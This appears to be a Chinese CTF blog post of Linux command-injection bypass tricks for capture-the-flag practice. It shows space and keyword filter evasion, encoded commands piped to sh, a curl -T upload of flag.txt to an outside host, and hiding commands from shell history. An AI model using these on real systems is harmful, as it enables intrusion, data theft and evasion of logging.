@@ -1,0 +1,109 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Linux在CTF中的一些小技巧"><meta name="keywords" content="CTF"><meta name="author" content="Bobtaoy"><meta name="copyright" content="Bobtaoy"><title>Linux在CTF中的一些小技巧 | Tao's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '5.2.0'
+} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tao's blog" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E9%99%90%E5%88%B6%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.</span> <span class="toc-text">场景一：限制空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E4%B8%8D%E5%85%81%E8%AE%B8%E6%8C%87%E5%AE%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">场景二：不允许指定命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9A%E4%B8%80%E6%AC%A1%E6%89%A7%E8%A1%8C%E5%A4%9A%E6%9D%A1%E5%91%BD%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">场景三：一次执行多条命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">命令编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.</span> <span class="toc-text">字符替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-T-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">curl -T 上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E5%91%BD%E4%BB%A4%E8%A2%AB%E8%AE%B0%E5%BD%95"><span class="toc-number">7.</span> <span class="toc-text">防止命令被记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">8.</span> <span class="toc-text">利用文件名执行命令</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Bobtaoy</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">13</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://w.wallhaven.cc/full/j5/wallhaven-j5mz95.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tao's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Linux在CTF中的一些小技巧</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-04</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>CTF中各种花里胡哨的操作还是挺多的，这里参考大佬的文章，做了更详细的总结！</p>
+<h2 id="场景一：限制空格"><a href="#场景一：限制空格" class="headerlink" title="场景一：限制空格"></a>场景一：限制空格</h2><p> 假如需要实现 <strong>cat flag.txt</strong> 命令读取flag： </p>
+<ol>
+<li>利用&lt;&gt;重定向符：</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085145611.png" alt="image-20191203085145611"></p>
+<ol start="2">
+<li>利用${IFS}变量(内部域分隔符)：</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085620660.png" alt="image-20191203085327815"></p>
+<ol start="3">
+<li>利用{,}来代替：</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085410858.png" alt="image-20191203085410858"></p>
+<ol start="4">
+<li>利用$IFS$9:</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085327815.png" alt="image-20191203085455982"></p>
+<h2 id="场景二：不允许指定命令执行"><a href="#场景二：不允许指定命令执行" class="headerlink" title="场景二：不允许指定命令执行"></a>场景二：不允许指定命令执行</h2><p> 假如需要执行 <strong>uname</strong> 命令，但过滤掉了 uname 字符： </p>
+<ol>
+<li>利用参数拼接（黑名单绕过）：</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085455982.png" alt="image-20191203085620660"></p>
+<ol start="2">
+<li><p>利用’ “  单、双引号（碰到 escapeshellcmd() 时有效bypass）： </p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085954623.png" alt="image-20191203085659619"></p>
+</li>
+</ol>
+<p>单、双引号成对出现不过滤，表示空字符串；</p>
+<ol start="3">
+<li>利用 <strong>`</strong> 小引号，就是Tab上那个引号：</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090216583.png" alt="image-20191203085835665"></p>
+<p>如果一串命令中存在``，会先执行引号内的命令；</p>
+<p>这也就是利用DNS传数据的利用点；</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085659619.png" alt="image-20191203085954623"></p>
+<ol start="4">
+<li>利用转义符号\反斜杠来绕过</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085835665.png" alt="image-20191203090216583"></p>
+<h2 id="场景三：一次执行多条命令"><a href="#场景三：一次执行多条命令" class="headerlink" title="场景三：一次执行多条命令"></a>场景三：一次执行多条命令</h2><p>假如需要执行uname和id命令：</p>
+<ol>
+<li><p>利用shell脚本结束符; 分号：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090345359.png" alt="image-20191203090345359"></p>
+</li>
+<li><p>利用逻辑符号(&amp;,&amp;&amp;,|,||)</p>
+</li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090709704.png" alt="image-20191203090538453"></p>
+<ol start="2">
+<li>在Web页面执行时可以利用回车的url编码 <strong>%0a</strong> 来绕过 </li>
+</ol>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090538453.png" alt="image-20191203090709704"></p>
+<p>类似在shell脚本下放了两条命令</p>
+<h2 id="命令编码绕过"><a href="#命令编码绕过" class="headerlink" title="命令编码绕过"></a>命令编码绕过</h2><p><strong>base64</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | base64</span></span><br><span class="line">d2hvYW1p</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;d2hvYW1p&quot; | base64 -d | sh</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091351029.png" alt="image-20191203091351029"></p>
+<p><strong>xxd（16进制）</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | xxd -p</span></span><br><span class="line">77686f616d69</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;77686f616d69&quot; | xxd -r -p | sh</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091508479.png" alt="image-20191203091508479"></p>
+<h2 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h2><p>Linux</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:2:1&#125;</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">ls</span><br><span class="line">root@Tao:/tmp<span class="comment"># $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203092308561.png" alt="image-20191203091905836"></p>
+<p> Linux：${PATH~: a :b}    其中a表示从a位开始，b表示截取的长度； （从0开始！！！）</p>
+<p>如果过滤了冒号:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 6 1)</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 3 1)</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># $(expr substr $PATH 6 1)$(expr substr $PATH 3 1)</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091905836.png" alt="image-20191203092308561"></p>
+<p><strong>Windows:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;echo %PATH%:~13,1</span><br><span class="line">C:\Program Files (x86)\....</span><br><span class="line">E:\tmp&gt;echo %PATH:~14,1%</span><br><span class="line">e</span><br></pre></td></tr></table></figure>
+
+<p> Windows：%PATH:~a,b%  (从1开始数)</p>
+<h2 id="curl-T-上传文件"><a href="#curl-T-上传文件" class="headerlink" title="curl -T 上传文件"></a>curl -T 上传文件</h2><p>首先，windows主机监听端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;nc.exe -l -v -p 2333</span><br></pre></td></tr></table></figure>
+
+<p>Linux服务器发送文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T .&#x2F;flag.txt http:&#x2F;&#x2F;1.1.1.1:2333</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203094014805.png" alt="image-20191203093411601"></p>
+<h2 id="防止命令被记录"><a href="#防止命令被记录" class="headerlink" title="防止命令被记录"></a>防止命令被记录</h2><p>在终端执行的每一条命令都会被记录在 history 文件中？</p>
+<p>不是的，如果在命令前加个<code>空格</code>，则会不被记录；</p>
+<p>并且前后重复的命令不会被记录；</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093836873.png" alt="image-20191203093836873"></p>
+<p>note：</p>
+<p>debain系可以，centos系不行；</p>
+<h2 id="利用文件名执行命令"><a href="#利用文件名执行命令" class="headerlink" title="利用文件名执行命令"></a>利用文件名执行命令</h2><p> <code>*</code>是Linux下的通配符，它会将符合模式的文件列出来，之后执行； </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># touch bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># echo id &gt;&gt; tao.bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">bash  tao.bash</span><br><span class="line">root@Tao:/tmp<span class="comment"># *</span></span><br><span class="line">uid=0(root) gid=0(root) 缁�=0(root)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093411601.png" alt="image-20191203094014805"></p>
+<p>参考文章:  <a target="_blank" rel="noopener" href="https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/">https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Bobtaoy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://www.ywboy.cn/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/">http://www.ywboy.cn/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/"><i class="fa fa-chevron-left">  </i><span>Python3--argparse模块简要使用</span></a></div><div class="next-post pull-right"><a href="/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/"><span>MD5加密后的SQL注入(骚操作)</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://w.wallhaven.cc/full/j5/wallhaven-j5mz95.png)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Bobtaoy</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
